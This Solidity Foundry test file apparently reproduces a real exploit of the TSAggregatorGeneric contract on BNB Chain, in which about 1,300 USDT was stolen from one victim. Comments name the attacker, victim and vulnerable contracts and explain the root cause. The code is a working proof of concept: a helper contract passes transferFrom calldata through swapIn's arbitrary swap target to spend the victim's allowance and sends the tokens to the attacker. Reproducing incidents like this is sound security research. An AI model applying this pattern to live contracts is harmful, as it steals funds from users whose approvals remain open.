// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1,300.00 USDT
// Attacker : 0xd76Bfdbfe0F47D63C99Ea47f05262E0D43097E5a
// Attack Contract : 0x7e0BDfaE4ECC3d84A4107625b7B7C227F598ef56
// Vulnerable Contract : 0xb6FA6f1dCd686f4A573fD243a6fABb4Ba36ba98C
// Attack Tx : https://bscscan.com/tx/0x077ea419bd5f0a20dc8f3da1281fbc96d6893201ebfd237742d01ae00a78e610
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb6FA6f1dCd686f4A573fD243a6fABb4Ba36ba98C#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1278
//
// Attack summary: The attacker called TSAggregatorGeneric.swapIn with zero WBNB input and used the caller-chosen
// swapRouter/data parameters to make the aggregator call USDT.transferFrom(victim, attacker helper, amount).
// Root cause: swapIn trusted arbitrary swap target calldata while the aggregator had victim USDT allowance, letting
// an attacker spend that allowance without performing a real swap.

address constant ATTACKER = 0xD76bFdbfe0F47d63C99EA47F05262E0d43097e5a;
address constant ATTACK_HELPER = 0x7E0BdfAe4ecc3D84A4107625B7b7C227f598Ef56;
address constant TS_AGGREGATOR = 0xB6fA6f1DcD686F4A573Fd243a6FABb4ba36Ba98c;
address constant VICTIM = 0x806aC20b7d84681cA8b8D52aB75B9ABEFa750131;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

interface ITSAggregatorGeneric {
    function swapIn(
        address router,
        address vault,
        string calldata memo,
        address token,
        uint256 amount,
        address swapRouter,
        bytes calldata data,
        uint256 deadline
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_426_887;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_HELPER, "Attack Helper");
        vm.label(TS_AGGREGATOR, "TSAggregatorGeneric");
        vm.label(VICTIM, "Victim");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog {
        uint256 victimBalanceBefore = IERC20(USDT_TOKEN).balanceOf(VICTIM);
        uint256 attackerBalanceBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);

        assertGt(victimBalanceBefore, 1_000 ether);
        assertGe(IERC20(USDT_TOKEN).allowance(VICTIM, TS_AGGREGATOR), victimBalanceBefore);

        // step 1: deploy an attacker helper that abuses the aggregator's arbitrary swap target/data.
        vm.prank(ATTACKER);
        TSAggregatorAttack attack = new TSAggregatorAttack(ATTACKER);
        attack.execute(victimBalanceBefore);

        // step 2: the victim's USDT allowance was spent by the aggregator and forwarded to the attacker.
        uint256 attackerProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBalanceBefore;
        assertEq(attackerProfit, victimBalanceBefore);
        assertEq(IERC20(USDT_TOKEN).balanceOf(VICTIM), 0);
    }
}

contract TSAggregatorAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute(
        uint256 amountToSteal
    ) external {
        bytes memory maliciousSwapData =
            abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM, address(this), amountToSteal);

        // step 3: zero WBNB input keeps tokenTransferProxy side effects empty; USDT is the attacker-chosen swap target.
        ITSAggregatorGeneric(TS_AGGREGATOR).swapIn(
            address(this),
            address(this),
            "",
            WBNB_TOKEN,
            0,
            USDT_TOKEN,
            maliciousSwapData,
            block.timestamp + 1 hours
        );

        IERC20(USDT_TOKEN).transfer(profitReceiver, IERC20(USDT_TOKEN).balanceOf(address(this)));
    }

    function depositWithExpiry(address payable, address, uint256, string memory, uint256) external payable {}
}
